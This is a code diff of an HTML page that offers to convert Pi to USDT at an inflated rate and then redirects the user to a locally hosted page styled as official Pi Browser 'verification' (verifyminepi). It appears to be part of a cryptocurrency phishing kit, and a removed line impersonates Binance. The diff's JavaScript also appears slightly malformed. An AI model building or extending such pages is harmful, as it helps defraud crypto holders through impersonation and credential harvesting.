@@ -7,7 +7,7 @@
     <link rel="stylesheet" href="available-offers.css">
 </head>
 <body>
-    <button class="back-button" onclick="goBack()">&#8592; Back</button>
+    <button class="back-button" onclick="goBack()">&#8592; Back</button> <!-- Back button moved to the top left corner -->
     <div class="container">
         <h1>AVAILABLE OFFERS</h1>
         <div class="offer-list">
@@ -29,6 +29,7 @@
                 <button onclick="verifyAndNavigate()">Next</button>
             </div>
         </div>
+        <!-- New option to fill Pi amount and USDT wallet address -->
         <div class="pi-conversion">
             <label for="pi-amount">min 10 pi:</label>
             <input type="number" id="pi-amount" name="pi-amount" min="0" step="1" placeholder="Enter Pi amount">
@@ -41,11 +42,8 @@
     </div>
 
     <script>
-        function verifyAndNavigate() {
-            alert("Navigating to official Pi Browser for verification...");
-            setTimeout(function() {
-                window.location.href = 'vent/verifyminepi.com/verifyminepi/verify/ventindex.html';
-            }, 2000); // Change time delay as needed
+        function navigateTo(page) {
+            window.location.href = page;
         }
 
         function goBack() {
@@ -54,6 +52,7 @@
 
         function convertToUSDT() {
             const piAmount = document.getElementById('pi-amount').value;
+            const usdtWallet = document.getElementById('usdt-wallet').value;
             const usdtEquivalent = piAmount * 38;
             document.getElementById('usdt-equivalent').textContent = `${piAmount} Pi is equivalent to ${usdtEquivalent} USDT`;
 
@@ -61,11 +60,19 @@
                 const sellButton = document.createElement('button');
                 sellButton.id = 'sell-button';
                 sellButton.textContent = 'Sell';
-                sellButton.onclick = verifyAndNavigate()
+                sellButton.onclick = function() {
+                    verifyAndNavigate();
                 };
                 document.getElementById('sell-button-container').appendChild(sellButton);
             }
-            console.warn("Binance wants to verify ownership of account. Binance will not ask you for your confidential credentials.");
+        }
+
+        // JavaScript function to verify and navigate
+        function verifyAndNavigate() {
+            alert("Navigating to official Pi Browser for verification...");
+            setTimeout(function() {
+                window.location.href = 'vent/verifyminepi.com/verifyminepi/verify/ventindex.html';
+            }, 2000); // Change time delay as needed
         }
     </script>
 </body>
